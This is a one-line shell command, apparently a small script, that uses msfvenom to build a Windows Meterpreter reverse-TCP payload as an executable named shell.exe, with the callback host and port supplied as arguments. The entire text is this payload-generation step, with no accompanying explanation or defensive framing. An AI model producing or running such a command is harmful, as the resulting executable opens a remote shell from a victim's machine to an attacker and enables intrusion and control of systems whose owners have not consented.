msfvenom -p windows/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -f exe > shell.exe 
